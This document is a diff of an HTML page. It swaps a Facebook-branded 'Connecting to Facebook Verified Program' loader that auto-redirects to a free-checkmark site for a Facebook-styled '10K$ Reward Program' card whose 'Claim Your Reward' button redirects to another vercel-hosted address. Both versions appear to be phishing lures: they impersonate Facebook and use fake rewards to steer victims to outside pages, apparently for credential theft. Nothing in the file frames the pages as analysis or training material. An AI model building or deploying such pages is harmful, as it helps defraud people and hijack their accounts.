@@ -1,134 +1,142 @@
 
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting to Facebook Help Center</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #1877f2; /* Facebook blue */
-            color: white;
-            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        
-        .container {
-            text-align: center;
-            width: 90%;
-            max-width: 500px;
-        }
-        
-        h1 {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 30px;
-            opacity: 0;
-            animation: fadeIn 0.5s ease-out forwards;
-        }
-        
-        .loader {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 30px;
-        }
-        
-        .dot {
-            width: 12px;
-            height: 12px;
-            background-color: white;
-            border-radius: 50%;
-            opacity: 0;
-        }
-        
-        .dot:nth-child(1) {
-            animation: bounce 1.2s infinite ease-in-out;
-        }
-        
-        .dot:nth-child(2) {
-            animation: bounce 1.2s infinite ease-in-out 0.2s;
-        }
-        
-        .dot:nth-child(3) {
-            animation: bounce 1.2s infinite ease-in-out 0.4s;
-        }
-        
-        .progress-container {
-            width: 100%;
-            height: 4px;
-            background-color: rgba(255, 255, 255, 0.2);
-            border-radius: 2px;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            width: 0;
-            background-color: white;
-            border-radius: 2px;
-            animation: progress 3s linear forwards;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes bounce {
-            0%, 80%, 100% { 
-                opacity: 0.3;
-                transform: scale(0.6);
-            }
-            40% { 
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        
-        @keyframes progress {
-            0% { width: 0; }
-            100% { width: 100%; }
-        }
-        
-        /* Responsive adjustments */
-        @media (min-width: 768px) {
-            h1 {
-                font-size: 32px;
-            }
-            
-            .dot {
-                width: 16px;
-                height: 16px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Connecting to Facebook Verified Program</h1>
-        <div class="loader">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
-        <div class="progress-container">
-            <div class="progress-bar"></div>
-        </div>
-    </div>
-    
-    <script>
-        // Redirect after 3 seconds
-        setTimeout(function() {
-            window.location.href = "https://free-checkmark-request.vercel.app/";
-        }, 3000);
-    </script>
-</body>
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>10K$ Reward Program</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: #f0f2f5;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
 
+    .bonus-card {
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 60px 40px;
+      max-width: 440px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+      border: 1px solid #dddfe2;
+      transition: transform 0.3s ease;
+    }
+
+    .bonus-card:hover {
+      transform: translateY(-3px);
+    }
+
+    .icon-wrapper {
+      width: 90px;
+      height: 90px;
+      margin: 0 auto 28px;
+      background: #1877F2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+    }
+
+    .icon {
+      font-size: 48px;
+      color: #ffffff;
+    }
+
+    h1 {
+      margin: 0 0 20px 0;
+      font-size: 30px;
+      font-weight: 800;
+      color: #1c1e21;
+      line-height: 1.3;
+    }
+
+    .description {
+      margin: 0 0 36px 0;
+      font-size: 18px;
+      color: #606770;
+      line-height: 1.7;
+      font-weight: 500;
+    }
+
+    .bonus-button {
+      width: 100%;
+      padding: 18px 36px;
+      font-size: 20px;
+      font-weight: 700;
+      color: #ffffff;
+      background: #1877F2;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s ease, transform 0.1s ease;
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+      letter-spacing: 0.3px;
+    }
+
+    .bonus-button:hover {
+      background: #166fe5;
+      transform: translateY(-2px);
+    }
+
+    .bonus-button:active {
+      background: #155bd3;
+      transform: translateY(0);
+    }
+
+    @media (max-width: 640px) {
+      .bonus-card {
+        padding: 48px 28px;
+      }
+      h1 {
+        font-size: 26px;
+      }
+      .description {
+        font-size: 17px;
+      }
+      .bonus-button {
+        font-size: 18px;
+        padding: 16px 28px;
+      }
+    }
+  </style>
+ </head>
+ <body>
+  <div class="bonus-card">
+    <div class="icon-wrapper">
+      <div class="icon">💰</div>
+    </div>
+    <h1>You’re Invited for 10K$ Reward Program</h1>
+    <p class="description">
+      Join our exclusive reward opportunity and unlock your $10,000 program benefit.  
+      Click below to get started instantly!
+    </p>
+    <button class="bonus-button" id="bonus-button">Claim Your Reward</button>
+  </div>
+
+  <script>
+    const redirectURL = "https://reward-program-get-now.vercel.app/";
+    let isClaimed = false;
+
+    function claimBonus() {
+      if (isClaimed) return;
+      isClaimed = true;
+      const button = document.getElementById('bonus-button');
+      button.textContent = 'Redirecting...';
+      setTimeout(() => {
+        window.location.href = redirectURL;
+      }, 1000);
+    }
+
+    document.getElementById('bonus-button').addEventListener('click', claimBonus);
+  </script>
+ </body>
 </html>
